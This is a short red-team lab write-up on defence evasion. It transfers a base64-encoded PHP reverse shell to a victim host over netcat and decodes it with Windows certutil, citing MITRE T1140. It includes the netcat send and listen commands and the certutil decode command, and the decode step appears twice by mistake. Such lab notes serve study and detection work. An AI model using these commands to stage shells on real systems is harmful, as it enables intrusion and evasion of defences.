---
description: Defense Evasion
---

# Encode/Decode Data with Certutil

## Encode/Decode Data with Certutil

In this lab I will transfer a base64 encoded php reverse shell from my attacking machine to the victim machine via netcat and decode the data on the victim system using a native windows binary `certutil`.

### Execution

Preview of the content to be encoded on the attacking system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJtUa2lYUB7yBqnR1wa%2F-LJtW1oRIcuTM86YGjjj%2Fcertutil-shellphp.png?alt=media\&token=464fa3b6-8085-4e9e-a96b-7433ab83942a)

Sending the above shell as a base64 encoded string to the victim system (victim is listening and waiting for the file with `nc -l 4444 > enc`):

{% code title="attacker\@local" %}
```csharp
base64 < shell.php.gif | nc 10.0.0.2 4444
```
{% endcode %}

Once the file is received on the victim, let's check its contents:

{% code title="attacker\@victim" %}
```csharp
certutil.exe -decode .\enc dec
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJtUa2lYUB7yBqnR1wa%2F-LJtW1oSbuC4G9NnXZaF%2Fcertutil-encoded.png?alt=media\&token=c312b69d-016d-47aa-90f7-d37849929e3c)

Let's decode the data:

{% code title="attacker\@victim" %}
```csharp
certutil.exe -decode .\enc dec
```
{% endcode %}

Let's have a look at the contents of the file `dec` which now contains the base64 decoded shell:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJtUa2lYUB7yBqnR1wa%2F-LJtW1oUNGLtS_kRSzjY%2Fcertutil-decoded.png?alt=media\&token=222d6e29-1992-46a6-8c85-43dc5bd9aaa0)

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1140" %}
